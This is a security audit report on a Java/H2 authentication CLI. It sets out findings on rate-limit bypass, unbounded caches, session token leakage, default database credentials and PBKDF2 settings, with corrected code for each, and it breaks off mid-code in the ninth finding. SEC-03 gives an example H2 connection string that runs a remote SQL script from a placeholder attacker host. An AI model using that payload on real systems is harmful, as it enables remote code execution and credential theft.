# Security Review: Secure Java Authentication System (`com.example.auth`)

## 1. Executive Summary

The reviewed component is a self-contained Java 17 / Maven CLI authentication system
(`secure-auth-system-1.0.0`) that registers users and authenticates them against an
embedded H2 SQL database. It stores PBKDF2-HMAC-SHA256 password hashes with per-user
random salts, issues 256-bit `SecureRandom` session tokens, rate limits authentication
attempts in memory, and writes masked audit log records.

The cryptographic core is solid: all SQL is parameterised, password hashes are salted and
iterated, comparisons use `MessageDigest.isEqual`, secrets are zeroised from `char[]`/`byte[]`
buffers, and user-facing messages are uniformly generic so that account existence is not
disclosed. No SQL injection, no weak hash (MD5/SHA-1), no ECB mode, no hardcoded
application secret and no insecure deserialization were found.

The significant weaknesses are in the controls *around* the crypto:

* **Brute-force protection is defeatable (SEC-01, High).** Both hard limits are keyed on a
  caller-supplied source identifier, and a successful login resets the counters, so an
  attacker who varies `sourceId` faces nothing but a ≤3 second progressive delay when
  guessing passwords for a known account.
* **The rate-limiter cache is not actually bounded (SEC-02, Medium)** and is populated with
  unvalidated, unbounded-length e-mail strings *before* input validation runs, allowing
  heap exhaustion.
* **The JDBC URL is taken from the environment and handed straight to `DriverManager`
  (SEC-03, Medium)**, which for H2 means `;INIT=RUNSCRIPT FROM ...` can execute arbitrary
  SQL — despite the class comment claiming the configuration is validated.
* **The CLI masks the session token on one line and then prints it in full on the next
  (SEC-04, Medium).**
* Lower-severity issues: an unenforced session cap, an insecure default database account
  (`sa` with an empty password), a length-only password policy, a PBKDF2 iteration count
  below current OWASP guidance for SHA-256, a timing differential between the dummy and
  real verification paths, and silent password truncation/charset mangling on the
  non-console input path.

## 2. Scope

| File | Purpose | Security-relevant behaviour |
|---|---|---|
| `src/main/java/com/example/auth/Main.java` | CLI entry point; register / authenticate flows | Reads e-mail and password from `Console`/stdin, reads `AUTH_SOURCE_ID` env var, prints auth outcome, session token and cookie header, zeroises password arrays |
| `src/main/java/com/example/auth/AuthenticationService.java` | Orchestrates authentication and registration | Order of rate-limit / validation / DB lookup / verification, dummy-hash timing defence, generic failure results, password zeroisation, registration transaction |
| `src/main/java/com/example/auth/PasswordHasher.java` | PBKDF2 hashing and verification | PBKDF2WithHmacSHA256, 210 000 iterations, 16-byte `SecureRandom` salt, 256-bit key, `MessageDigest.isEqual` constant-time compare, memory zeroisation, static dummy salt/hash |
| `src/main/java/com/example/auth/InputValidator.java` | Trust-boundary input validation | E-mail regex and length bounds, password length bounds, source-id allow-list, validation of DB-sourced hash parameters, PBKDF2 iteration bounds |
| `src/main/java/com/example/auth/RateLimiter.java` | In-memory anti-brute-force throttling | Per-source and per-(source,account) fixed windows, global per-account progressive delay, `ConcurrentHashMap` caches with eviction, `synchronized` check-and-increment |
| `src/main/java/com/example/auth/SessionManager.java` | Session token issuance / validation | 32-byte `SecureRandom` tokens, URL-safe Base64, `__Host-` / `Secure` / `HttpOnly` / `SameSite=Strict` cookie, expiry check, in-memory session map and eviction |
| `src/main/java/com/example/auth/UserRepository.java` | User persistence | Parameterised `SELECT`/`INSERT`/`COUNT` statements, re-validation of values read back from the database, fail-closed on corrupt rows |
| `src/main/java/com/example/auth/DatabaseManager.java` | Connection lifecycle and schema DDL | JDBC URL / user / password resolved from environment, `DriverManager.getConnection`, idempotent DDL, POSIX 0700/0600 permissions on file-backed databases |
| `src/main/java/com/example/auth/SecurityLogger.java` | Audit logging | E-mail masking, token truncation, CR/LF neutralisation (CWE-117), internal failure reasons kept out of user-facing messages |
| `src/main/java/com/example/auth/AuthenticationResult.java` | Result/DTO for auth outcome | Fixed generic user messages for all failure modes (anti-enumeration) |
| `src/main/java/com/example/auth/UserRecord.java` | DTO for a user row | `isActive()` status check used as an authorisation gate |
| `src/main/java/com/example/auth/HashResult.java` | DTO for hash components | Null / positive-iteration invariants |
| `pom.xml` | Build configuration | Third-party dependency versions (H2 2.2.224, JUnit 5.10.2), shade plugin stripping `META-INF/*.SF` signatures |
| `src/test/java/com/example/auth/*.java` | Unit and adversarial tests | Test-only credentials; reviewed for coverage of the controls above, not part of the shipped attack surface |

## 3. Skills Applied

- `performing-cryptographic-audit-of-application`: applied to `PasswordHasher.java`,
  `SessionManager.java` and `InputValidator.java` — KDF choice and parameters, salt length
  and source of randomness, constant-time comparison, key/secret handling, zeroisation,
  hardcoded-secret scan across all files (SEC-08).
- `testing-api-authentication-weaknesses`: applied to `AuthenticationService.java`,
  `Main.java`, `SessionManager.java`, `AuthenticationResult.java` — password policy
  strength, account-enumeration response/timing differentials, token entropy, token
  lifecycle and revocation, token leakage into output/logs (SEC-04, SEC-07, SEC-09).
- `hunting-credential-stuffing-attacks` and `implementing-api-rate-limiting-and-throttling`:
  applied to `RateLimiter.java` and its call sites in `AuthenticationService.java` — choice
  of rate-limit key, resettability of counters, distributed/credential-stuffing resistance,
  counter storage bounds (SEC-01, SEC-02).
- `testing-for-sensitive-data-exposure`: applied to `SecurityLogger.java`, `Main.java` and
  `DatabaseManager.java` — secrets in source and in output streams, PII masking, local
  database file permissions (SEC-04, SEC-06).
- `exploiting-sql-injection-vulnerabilities`: applied to `UserRepository.java` and
  `DatabaseManager.java` — query construction, DDL execution, and the JDBC connection
  string as an injection sink (SEC-03; no SQLi in the query layer).
- `implementing-secrets-management-with-vault`: applied to `DatabaseManager.java` — how
  database credentials are sourced and what the fallbacks are (SEC-06).
- General OWASP Top 10 / CWE knowledge was used (no library skill matched) for: ReDoS
  analysis of the e-mail and source-id regular expressions, the registration
  check-then-insert race, `Thread.sleep`-based throttling as a thread-exhaustion vector,
  the stdin password reader's bounds and character decoding (SEC-10), `maven-shade-plugin`
  signature stripping, and the in-memory session store's eviction policy (SEC-05).

## 4. Summary of Findings

| ID | Title | Severity | CWE | Location |
|---|---|---|---|---|
| SEC-01 | Brute-force limits keyed on caller-controlled source identifier and reset on success | High | CWE-307 | `src/main/java/com/example/auth/RateLimiter.java:108-144` |
| SEC-02 | Rate-limiter caches are unbounded; keys built from unvalidated e-mail input | Medium | CWE-770 | `src/main/java/com/example/auth/RateLimiter.java:197-204` |
| SEC-03 | JDBC URL taken from environment without validation (H2 `INIT` script execution) | Medium | CWE-15 | `src/main/java/com/example/auth/DatabaseManager.java:132-137` |
| SEC-04 | Full session token printed to stdout in the cookie header | Medium | CWE-532 | `src/main/java/com/example/auth/Main.java:87` |
| SEC-05 | Insecure default database account `sa` with empty password | Medium | CWE-1188 | `src/main/java/com/example/auth/DatabaseManager.java:140-148` |
| SEC-06 | `MAX_ACTIVE_SESSIONS` is never enforced; session map can grow without bound | Low | CWE-770 | `src/main/java/com/example/auth/SessionManager.java:115-124` |
| SEC-07 | Length-only password policy accepts common and trivial passwords | Low | CWE-521 | `src/main/java/com/example/auth/InputValidator.java:105-110` |
| SEC-08 | PBKDF2-HMAC-SHA256 iteration count below current OWASP guidance | Low | CWE-916 | `src/main/java/com/example/auth/PasswordHasher.java:20` |
| SEC-09 | Dummy verification uses the default iteration count, leaking stored parameters by timing | Low | CWE-208 | `src/main/java/com/example/auth/PasswordHasher.java:157` |
| SEC-10 | Silent password truncation and byte-to-char decoding on the stdin path | Low | CWE-20 | `src/main/java/com/example/auth/Main.java:178-194` |

## 5. Detailed Findings

### SEC-01: Brute-force limits keyed on caller-controlled source identifier and reset on success
- **Severity:** High
- **CWE:** CWE-307: Improper Restriction of Excessive Authentication Attempts
- **Location:** `src/main/java/com/example/auth/RateLimiter.java:108-144` (also `RateLimiter.java:164-176`, `AuthenticationService.java:61-69`)

**Vulnerable code:**
```java
// src/main/java/com/example/auth/RateLimiter.java:108-144
    public RateLimitResult checkAndAcquire(String sourceId, String email) {
        long now = System.currentTimeMillis();
        evictIfNecessary(now);

        String safeSource = InputValidator.sanitizeSourceId(sourceId);
        String safeEmail = InputValidator.canonicalizeEmail(email);
        String sourceAccountKey = safeSource + ":" + safeEmail;

        // 1. Check and acquire source permit atomically
        AttemptTracker sourceTracker = getOrCreateTracker(sourceTrackers, safeSource, SOURCE_WINDOW_MS, MAX_SOURCE_ATTEMPTS, now);
        boolean sourceAllowed = sourceTracker.tryAcquire(now);
        if (!sourceAllowed) {
            return new RateLimitResult(Status.SOURCE_BLOCKED, 0, "Source IP / client rate limit exceeded");
        }

        // 2. Check and acquire (source, account) permit atomically
        AttemptTracker sourceAccountTracker = getOrCreateTracker(sourceAccountTrackers, sourceAccountKey,
                SOURCE_ACCOUNT_WINDOW_MS, MAX_SOURCE_ACCOUNT_ATTEMPTS, now);
        boolean sourceAccountAllowed = sourceAccountTracker.tryAcquire(now);
        if (!sourceAccountAllowed) {
            return new RateLimitResult(Status.SOURCE_ACCOUNT_BLOCKED, 0,
                    "Too many failed attempts for this account from current source");
        }

        // 3. Check global account throttle to defend against distributed attacks without DoSing legitimate users
        long progressiveDelayMs = 0;
        if (!safeEmail.isEmpty()) {
            AttemptTracker globalAccountTracker = getOrCreateTracker(globalAccountTrackers, safeEmail,
                    GLOBAL_ACCOUNT_WINDOW_MS, Integer.MAX_VALUE, now);
            int globalFailures = globalAccountTracker.getCount(now);
            if (globalFailures >= GLOBAL_ACCOUNT_THROTTLE_THRESHOLD) {
                int excess = globalFailures - GLOBAL_ACCOUNT_THROTTLE_THRESHOLD + 1;
                progressiveDelayMs = Math.min((long) excess * 500L, MAX_PROGRESSIVE_DELAY_MS);
            }
        }

        return new RateLimitResult(Status.ALLOWED, progressiveDelayMs, "Attempt permitted");
    }
```

**Why it is a problem:** The only two limits that can actually *deny* an attempt
(`Status.SOURCE_BLOCKED`, `Status.SOURCE_ACCOUNT_BLOCKED`) are keyed on `safeSource`, which
is derived entirely from the `sourceId` argument supplied by the caller
(`Main.java:76-79` takes it from the `AUTH_SOURCE_ID` environment variable; in a server
deployment it would be a client-influenced value such as an `X-Forwarded-For` header).
`InputValidator.sanitizeSourceId` only checks the character set and length — it does not bind
the value to anything the attacker cannot change. An attacker who presents a fresh
`sourceId` for every request creates a fresh tracker each time and therefore never exhausts
either window. The only remaining per-account defence is the global throttle, which never
blocks: it is created with `maxAttempts = Integer.MAX_VALUE` and contributes at most a
`MAX_PROGRESSIVE_DELAY_MS` (3 s) sleep. Sustained password guessing against a single known
account is thus possible at roughly 20 attempts/minute per thread, indefinitely, with no
lockout and no alerting threshold ever tripped.

Two further weaknesses compound this. First, `recordAuthenticationSuccess` resets the
source, source-account *and* global trackers, so an attacker who controls any one valid
account can clear the counters at will between guessing bursts:

```java
// src/main/java/com/example/auth/RateLimiter.java:164-176
    public void recordAuthenticationSuccess(String sourceId, String email) {
        long now = System.currentTimeMillis();
        String safeSource = InputValidator.sanitizeSourceId(sourceId);
        String safeEmail = InputValidator.canonicalizeEmail(email);
        String sourceAccountKey = safeSource + ":" + safeEmail;

        AttemptTracker sourceTracker = sourceTrackers.get(safeSource);
        if (sourceTracker != null) {
            sourceTracker.reset();
        }
```

Second, `AuthenticationService.registerUser` (`AuthenticationService.java:147`) is not rate
limited at all, so the 210 000-iteration PBKDF2 derivation it performs can be invoked
without restriction as a CPU-exhaustion primitive.

**Fix:** Keep the attacker-controlled identifier as a *secondary* dimension only, and make
the per-account limiter capable of denying requests (with a bounded lockout window rather
than a permanent one, so legitimate users are not locked out indefinitely). Derive the
source key from a value the caller cannot forge (the real socket peer address at the
network boundary), only count *failures* toward the limit, and never let a successful login
reset the global per-account counter. Apply the same limiter to the registration path.

```java
    // Per-account failure limit that can actually block, independent of any caller-supplied value.
    public static final int MAX_ACCOUNT_FAILURES = 10;
    public static final long ACCOUNT_LOCKOUT_WINDOW_MS = 15 * 60 * 1000L;

    public RateLimitResult checkAndAcquire(String trustedSourceId, String email) {
        long now = System.currentTimeMillis();
        evictIfNecessary(now);

        // trustedSourceId must be supplied by the transport layer (socket peer address),
        // never by a client-controlled header, argument or environment variable.
        String safeSource = InputValidator.sanitizeSourceId(trustedSourceId);
        String safeEmail = InputValidator.canonicalizeEmail(email);
        String sourceAccountKey = safeSource + ":" + safeEmail;

        AttemptTracker sourceTracker = getOrCreateTracker(sourceTrackers, safeSource,
                SOURCE_WINDOW_MS, MAX_SOURCE_ATTEMPTS, now);
        if (!sourceTracker.tryAcquire(now)) {
            return new RateLimitResult(Status.SOURCE_BLOCKED, 0, "Source rate limit exceeded");
        }

        AttemptTracker sourceAccountTracker = getOrCreateTracker(sourceAccountTrackers, sourceAccountKey,
                SOURCE_ACCOUNT_WINDOW_MS, MAX_SOURCE_ACCOUNT_ATTEMPTS, now);
        if (!sourceAccountTracker.tryAcquire(now)) {
            return new RateLimitResult(Status.SOURCE_ACCOUNT_BLOCKED, 0,
                    "Too many attempts for this account from current source");
        }

        // Global per-account limit: blocks regardless of how many source identities are used.
        long progressiveDelayMs = 0;
        if (!safeEmail.isEmpty()) {
            AttemptTracker accountTracker = getOrCreateTracker(globalAccountTrackers, safeEmail,
                    ACCOUNT_LOCKOUT_WINDOW_MS, MAX_ACCOUNT_FAILURES, now);
            int failures = accountTracker.getCount(now);
            if (failures >= MAX_ACCOUNT_FAILURES) {
                return new RateLimitResult(Status.ACCOUNT_BLOCKED, 0,
                        "Account temporarily locked after repeated failures");
            }
            if (failures >= GLOBAL_ACCOUNT_THROTTLE_THRESHOLD) {
                int excess = failures - GLOBAL_ACCOUNT_THROTTLE_THRESHOLD + 1;
                progressiveDelayMs = Math.min((long) excess * 500L, MAX_PROGRESSIVE_DELAY_MS);
            }
        }
        return new RateLimitResult(Status.ALLOWED, progressiveDelayMs, "Attempt permitted");
    }

    public void recordAuthenticationSuccess(String trustedSourceId, String email) {
        String safeSource = InputValidator.sanitizeSourceId(trustedSourceId);
        String safeEmail = InputValidator.canonicalizeEmail(email);

        // Reset only the counters scoped to this (source, account) pair.
        AttemptTracker sourceAccountTracker = sourceAccountTrackers.get(safeSource + ":" + safeEmail);
        if (sourceAccountTracker != null) {
            sourceAccountTracker.reset();
        }
        // The global per-account failure counter is deliberately NOT reset here:
        // a single success must not erase evidence of a distributed guessing campaign.
    }
```

### SEC-02: Rate-limiter caches are unbounded; keys built from unvalidated e-mail input
- **Severity:** Medium
- **CWE:** CWE-770: Allocation of Resources Without Limits or Throttling
- **Location:** `src/main/java/com/example/auth/RateLimiter.java:197-204` (keys created at `RateLimiter.java:112-114`, called before validation at `AuthenticationService.java:62-65`)

**Vulnerable code:**
```java
// src/main/java/com/example/auth/RateLimiter.java:197-204
    private void evictIfNecessary(long now) {
        if (entryCount.get() > MAX_CACHE_ENTRIES) {
            purgeExpired(sourceTrackers, now);
            purgeExpired(sourceAccountTrackers, now);
            purgeExpired(globalAccountTrackers, now);
            entryCount.set(sourceTrackers.size() + sourceAccountTrackers.size() + globalAccountTrackers.size());
        }
    }
```

```java
// src/main/java/com/example/auth/AuthenticationService.java:61-65
            String safeSource = InputValidator.sanitizeSourceId(sourceId);
            String safeEmail = InputValidator.canonicalizeEmail(email);

            // 1. Concurrency & Rate Limiting Check (Rules 3 & 7)
            RateLimiter.RateLimitResult rateCheck = rateLimiter.checkAndAcquire(safeSource, safeEmail);
```

**Why it is a problem:** The comment above `evictIfNecessary` claims it "enforces bounded
memory", but it only removes trackers whose *window has expired*. Inside a 5–10 minute
window nothing is expired, so `MAX_CACHE_ENTRIES` is a trigger for a sweep that frees
nothing — the three maps keep growing and `MAX_CACHE_ENTRIES` is never actually enforced.

The keys make this worse. `AuthenticationService.authenticate` calls
`InputValidator.canonicalizeEmail(email)` (line 62) and immediately passes the result to
`checkAndAcquire` (line 65) — *before* `InputValidator.isValidEmail(email)` runs at line 83.
`canonicalizeEmail` only trims and lower-cases; it applies no length or character bound at
all. Every attempt therefore inserts up to two map entries keyed on an arbitrary,
arbitrary-length attacker-supplied string (`safeEmail` and `safeSource + ":" + safeEmail`),
with no requirement that the e-mail be well-formed or even plausible. A handful of
requests carrying multi-megabyte "e-mail" values, or a stream of unique garbage addresses,
retains that memory for the full window and exhausts the heap — a denial of service against
the authentication service as a whole.

**Fix:** Bound the keys and bound the maps. Validate and length-limit the e-mail before it
is ever used as a cache key, and make eviction fall back to removing the oldest entries (or
use a size-capped LRU / `Caffeine`-style cache with a maximum size and TTL) when purging
expired entries does not bring the map back under its limit.

```java
// InputValidator: add a key-safe canonicaliser that cannot produce unbounded keys.
    public static String canonicalizeEmailForKey(String email) {
        if (!isValidEmail(email)) {
            return "invalid-email";   // single shared bucket for all malformed input
        }
        return canonicalizeEmail(email);
    }

// AuthenticationService.authenticate: validate first, then rate limit.
            String safeSource = InputValidator.sanitizeSourceId(sourceId);
            boolean emailValid = InputValidator.isValidEmail(email);
            boolean passwordValid = InputValidator.isValidPasswordForAuth(passwordChars);
            String safeEmail = InputValidator.canonicalizeEmailForKey(email);

            RateLimiter.RateLimitResult rateCheck = rateLimiter.checkAndAcquire(safeSource, safeEmail);

// RateLimiter: make the cap real - purge expired entries, then force the map under its limit.
    private void evictIfNecessary(long now) {
        if (entryCount.get() <= MAX_CACHE_ENTRIES) {
            return;
        }
        purgeExpired(sourceTrackers, now);
        purgeExpired(sourceAccountTrackers, now);
        purgeExpired(globalAccountTrackers, now);
        enforceHardCap(sourceTrackers, MAX_CACHE_ENTRIES / 3);
        enforceHardCap(sourceAccountTrackers, MAX_CACHE_ENTRIES / 3);
        enforceHardCap(globalAccountTrackers, MAX_CACHE_ENTRIES / 3);
        entryCount.set(sourceTrackers.size() + sourceAccountTrackers.size() + globalAccountTrackers.size());
    }

    private void enforceHardCap(ConcurrentHashMap<String, AttemptTracker> map, int cap) {
        Iterator<Map.Entry<String, AttemptTracker>> it = map.entrySet().iterator();
        while (map.size() > cap && it.hasNext()) {
            it.next();
            it.remove();   // shed load rather than exhaust the heap
        }
    }
```

### SEC-03: JDBC URL taken from environment without validation (H2 `INIT` script execution)
- **Severity:** Medium
- **CWE:** CWE-15: External Control of System or Configuration Setting
- **Location:** `src/main/java/com/example/auth/DatabaseManager.java:132-137` (sink at `DatabaseManager.java:56`)

**Vulnerable code:**
```java
// src/main/java/com/example/auth/DatabaseManager.java:132-137
    private static String resolveDatabaseUrl() {
        String envUrl = System.getenv("AUTH_DB_URL");
        if (envUrl != null && !envUrl.isBlank()) {
            return envUrl.trim();
        }
        return DEFAULT_IN_MEMORY_URL;
    }
```

```java
// src/main/java/com/example/auth/DatabaseManager.java:55-57
    public Connection getConnection() throws SQLException {
        return DriverManager.getConnection(this.dbUrl, this.dbUser, this.dbPassword);
    }
```

**Why it is a problem:** The class header asserts "Rule 1: Validates database
configuration", but the only check performed on `dbUrl` is a null/blank test
(`DatabaseManager.java:40-42`). The string is passed verbatim to
`DriverManager.getConnection`. H2 JDBC URLs carry executable semantics: an attacker who can
set `AUTH_DB_URL` — or any caller of the public `DatabaseManager(String, String, String)`
constructor that forwards externally-influenced configuration — can supply
`jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker/evil.sql'` and have arbitrary SQL
(including `CREATE ALIAS` Java stored procedures) executed at connection time, or point the
URL at an attacker-controlled remote H2 server (`jdbc:h2:tcp://...`) to harvest every
credential the application subsequently writes. Because the connection is opened inside the
constructor via `initializeSchema()`, this fires before any other control runs. The same
unvalidated URL also drives the file-permission logic at `DatabaseManager.java:91-95`, so a
URL form the parser does not recognise silently skips the 0700/0600 hardening.

**Fix:** Treat the connection string as untrusted configuration: accept only an allow-listed
set of URL shapes, and reject any URL carrying H2 connection *settings* such as `INIT`,
`RUNSCRIPT`, `FORBID_CREATION` overrides or `TRACE_LEVEL_FILE`. Better still, take the host,
database name and credentials as separate configuration values and build the URL in code.

```java
    private static final Pattern ALLOWED_DB_URL = Pattern.compile(
            "^jdbc:h2:(mem:[A-Za-z0-9_]+|\\.?/[A-Za-z0-9_./-]+)(;DB_CLOSE_DELAY=-1)?$");

    private static String resolveDatabaseUrl() {
        String envUrl = System.getenv("AUTH_DB_URL");
        if (envUrl == null || envUrl.isBlank()) {
            return DEFAULT_IN_MEMORY_URL;
        }
        String candidate = envUrl.trim();
        if (!ALLOWED_DB_URL.matcher(candidate).matches()) {
            // Fail closed: never hand an unrecognised connection string to DriverManager.
            throw new IllegalStateException("AUTH_DB_URL is not an allowed database URL");
        }
        return candidate;
    }
```

### SEC-04: Full session token printed to stdout in the cookie header
- **Severity:** Medium
- **CWE:** CWE-532: Insertion of Sensitive Information into Log File (also CWE-200: Exposure of Sensitive Information to an Unauthorized Actor)
- **Location:** `src/main/java/com/example/auth/Main.java:85-88`

**Vulnerable code:**
```java
// src/main/java/com/example/auth/Main.java:85-88
                result.getSession().ifPresent(session -> {
                    System.out.println("Session Token: " + SecurityLogger.maskToken(session.sessionId()));
                    System.out.println("Cookie: " + session.cookieHeader());
                });
```

**Why it is a problem:** Line 86 deliberately masks the session identifier through
`SecurityLogger.maskToken`, and line 87 then defeats that by printing
`session.cookieHeader()`, which is built at `SessionManager.java:80-83` as
`"__Host-AuthSession=<full token>; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=3600"`
— i.e. the complete bearer credential in clear text. Anything capturing the process's
standard output (a shell scrollback, `script`/`tee` transcript, CI job log, systemd journal,
container log shipped to a central aggregator) now holds a credential that is valid for an
hour and, because `SessionManager.validateSession` performs a plain map lookup, grants full
authenticated access to whoever replays it. The `HttpOnly` flag in that same string is
protecting the token from JavaScript while the application writes it to a log file.

**Fix:** Never render the raw token. Print the masked identifier plus the cookie
*attributes* for diagnostic purposes, and return the cookie header only through the channel
that needs it (an HTTP `Set-Cookie` response), not through stdout.

```java
                result.getSession().ifPresent(session -> {
                    System.out.println("Session Token: " + SecurityLogger.maskToken(session.sessionId()));
                    System.out.println("Session expires at: " + session.expiresAt());
                    // Cookie attributes only - the token value is never written to stdout or logs.
                    System.out.println("Cookie attributes: __Host-AuthSession=<redacted>; "
                            + "Path=/; Secure; HttpOnly; SameSite=Strict");
                });
```

### SEC-05: Insecure default database account `sa` with empty password
- **Severity:** Medium
- **CWE:** CWE-1188: Initialization of a Resource with an Insecure Default (also CWE-258: Empty Password in Configuration File)
- **Location:** `src/main/java/com/example/auth/DatabaseManager.java:140-148`

**Vulnerable code:**
```java
// src/main/java/com/example/auth/DatabaseManager.java:140-148
    private static String resolveUser() {
        String envUser = System.getenv("AUTH_DB_USER");
        return (envUser != null) ? envUser.trim() : "sa";
    }

    private static String resolvePassword() {
        String envPass = System.getenv("AUTH_DB_PASSWORD");
        return (envPass != null) ? envPass : "";
    }
```

**Why it is a problem:** If `AUTH_DB_PASSWORD` is unset the application connects — and, for
a file-backed H2 database, *creates* the database — with the well-known administrative user
`sa` and an empty password. H2 fixes the credentials at database-creation time, so the
resulting `authdb.mv.db` file is readable by anyone who can supply `sa`/`""`, which is the
first guess any attacker makes. The POSIX 0600 permissions applied at
`DatabaseManager.java:115-120` are then the *only* control standing between a local
unprivileged user (or a backup copy, or a container volume) and the full table of password
hashes. The deployment silently gets no database authentication at all, and nothing warns
the operator: `printUsage` (`Main.java:206`) documents the empty default as normal. Note
also that `resolveUser`/`resolvePassword` return the configured value when the variable is
set to the empty string, so `AUTH_DB_PASSWORD=""` is indistinguishable from "unset".

**Fix:** Require an explicit password whenever the database is not an ephemeral in-memory
instance, and fail closed if it is missing rather than falling back to a blank credential.

```java
    private static String resolveUser() {
        String envUser = System.getenv("AUTH_DB_USER");
        if (envUser == null || envUser.isBlank()) {
            throw new IllegalStateException("AUTH_DB_USER must be set");
        }
        return envUser.trim();
    }

    private static String resolvePassword() {
        String envPass = System.getenv("AUTH_DB_PASSWORD");
        boolean ephemeral = resolveDatabaseUrl().startsWith("jdbc:h2:mem:");
        if ((envPass == null || envPass.isEmpty()) && !ephemeral) {
            // Never create or open a persistent database with a blank password.
            throw new IllegalStateException(
                    "AUTH_DB_PASSWORD must be set for a persistent database");
        }
        return (envPass != null) ? envPass : "";
    }
```

### SEC-06: `MAX_ACTIVE_SESSIONS` is never enforced; session map can grow without bound
- **Severity:** Low
- **CWE:** CWE-770: Allocation of Resources Without Limits or Throttling
- **Location:** `src/main/java/com/example/auth/SessionManager.java:115-124`

**Vulnerable code:**
```java
// src/main/java/com/example/auth/SessionManager.java:115-124
    private void evictIfNecessary() {
        if (activeSessions.size() > MAX_ACTIVE_SESSIONS) {
            Iterator<Map.Entry<String, Session>> it = activeSessions.entrySet().iterator();
            while (it.hasNext()) {
                Map.Entry<String, Session> entry = it.next();
                if (entry.getValue().isExpired()) {
                    it.remove();
                }
            }
        }
    }
```

**Why it is a problem:** The declared cap `MAX_ACTIVE_SESSIONS = 10_000`
(`SessionManager.java:25`) is never actually applied. The sweep only removes sessions that
have already passed `expiresAt`, and it runs only once the map is already over the cap; if
more than 10 000 sessions are created inside the one-hour `DEFAULT_SESSION_DURATION_SECONDS`
window, nothing is expired, nothing is removed, and `createSession` adds the new entry
anyway at line 86. Sessions are also never swept in the background — only on the next
`createSession` call — so a burst of successful logins followed by idleness leaves every
session object resident for the full hour. The map is bounded only by the heap, giving a
memory-exhaustion path for an actor holding (or farming) valid credentials.

**Fix:** After purging expired sessions, enforce the cap by evicting the sessions closest to
expiry, and refuse to issue a new session if the cap still cannot be met.

```java
    private void evictIfNecessary() {
        if (activeSessions.size() <= MAX_ACTIVE_SESSIONS) {
            return;
        }
        activeSessions.entrySet().removeIf(e -> e.getValue().isExpired());

        // Still over the cap: evict the oldest sessions so the bound is real.
        while (activeSessions.size() > MAX_ACTIVE_SESSIONS) {
            Optional<Map.Entry<String, Session>> oldest = activeSessions.entrySet().stream()
                    .min(Comparator.comparing(e -> e.getValue().expiresAt()));
            if (oldest.isEmpty()) {
                break;
            }
            activeSessions.remove(oldest.get().getKey());
        }
    }
```

### SEC-07: Length-only password policy accepts common and trivial passwords
- **Severity:** Low
- **CWE:** CWE-521: Weak Password Requirements
- **Location:** `src/main/java/com/example/auth/InputValidator.java:105-110`

**Vulnerable code:**
```java
// src/main/java/com/example/auth/InputValidator.java:105-110
    public static boolean isValidPasswordForCreation(char[] password) {
        if (password == null) {
            return false;
        }
        return password.length >= MIN_PASSWORD_LENGTH && password.length <= MAX_PASSWORD_LENGTH;
    }
```

**Why it is a problem:** Registration accepts any 8-character password, so `"password"`,
`"12345678"`, `"qwertyui"` and the e-mail address itself all pass. Combined with SEC-01
(no effective per-account attempt limit), a guessing campaign against the handful of most
common passwords has a realistic chance of success; a strong KDF does not help when the
plaintext is in the first thousand entries of any leak list. OWASP ASVS requires either a
breach/blocklist check or a substantially longer minimum.

**Fix:** Raise the minimum length and reject passwords that appear in a breach corpus or
derive from the user's own identifiers. Check against a blocklist rather than imposing
character-class rules, which push users toward predictable substitutions.

```java
    public static final int MIN_PASSWORD_LENGTH = 12;

    /**
     * Validates password strength for registration. Length-bounded and screened against
     * a breach/common-password blocklist (OWASP ASVS 2.1.7).
     */
    public static boolean isValidPasswordForCreation(char[] password, String email) {
        if (password == null) {
            return false;
        }
        if (password.length < MIN_PASSWORD_LENGTH || password.length > MAX_PASSWORD_LENGTH) {
            return false;
        }
        if (PasswordBlocklist.isCommon(password)) {   // k-anonymity HIBP lookup or local list
            return false;
        }
        return !PasswordBlocklist.containsIdentifier(password, email);
    }
```

### SEC-08: PBKDF2-HMAC-SHA256 iteration count below current OWASP guidance
- **Severity:** Low
- **CWE:** CWE-916: Use of Password Hash With Insufficient Computational Effort
- **Location:** `src/main/java/com/example/auth/PasswordHasher.java:19-22`

**Vulnerable code:**
```java
// src/main/java/com/example/auth/PasswordHasher.java:19-22
    public static final String ALGORITHM = "PBKDF2WithHmacSHA256";
    public static final int DEFAULT_ITERATIONS = 210_000;
    public static final int SALT_BYTE_LENGTH = 16; // 128 bits
    public static final int KEY_BIT_LENGTH = 256;  // 256 bits
```

**Why it is a problem:** 210 000 iterations is the OWASP Password Storage Cheat Sheet figure
for PBKDF2-**HMAC-SHA512**; for PBKDF2-**HMAC-SHA256**, which is what `ALGORITHM` selects,
the recommended work factor is 600 000. The configuration therefore delivers roughly a third
of the intended offline-cracking resistance, which matters directly if the hash table is
ever disclosed (see SEC-05 for a realistic disclosure path). PBKDF2 is also not
memory-hard, so it is comparatively cheap to attack on GPUs. There is no stored
algorithm-upgrade path either: `InputValidator.isValidDatabaseHashParameters`
(`InputValidator.java:145-147`) hard-rejects any algorithm other than the current one, so
migrating later requires a code change plus a re-hash-on-login strategy.

**Fix:** Prefer a memory-hard KDF (Argon2id, or scrypt/bcrypt where Argon2 is unavailable).
If PBKDF2 must be retained, use 600 000 iterations with HMAC-SHA256, and re-hash a user's
password on their next successful login whenever the stored parameters are below current
policy.

```java
    public static final String ALGORITHM = "PBKDF2WithHmacSHA256";
    // OWASP Password Storage Cheat Sheet: 600,000 iterations for PBKDF2-HMAC-SHA256
    // (210,000 is the SHA-512 figure). Argon2id is preferred where a library is available.
    public static final int DEFAULT_ITERATIONS = 600_000;
    public static final int SALT_BYTE_LENGTH = 16; // 128 bits
    public static final int KEY_BIT_LENGTH = 256;  // 256 bits

    /** True when a stored hash was produced with weaker parameters and should be upgraded on login. */
    public boolean needsRehash(String algorithm, int storedIterations) {
        return !ALGORITHM.equals(algorithm) || storedIterations < DEFAULT_ITERATIONS;
    }
```

### SEC-09: Dummy verification uses the default iteration count, leaking stored parameters by timing
- **Severity:** Low
- **CWE:** CWE-208: Observable Timing Discrepancy
- **Location:** `src/main/java/com/example/auth/PasswordHasher.java:150-166`

**Vulnerable code:**
```java
// src/main/java/com/example/auth/PasswordHasher.java:150-160
    public boolean verifyDummyPassword(char[] candidatePassword) {
        char[] passwordToUse = (candidatePassword != null && InputValidator.isValidPasswordForAuth(candidatePassword))
                ? candidatePassword
                : DUMMY_INPUT_PASSWORD;

        byte[] derived = null;
        try {
            derived = deriveKey(passwordToUse, DUMMY_SALT, DEFAULT_ITERATIONS, KEY_BIT_LENGTH);
            // Constant-time comparison against dummy hash to match branch execution flow
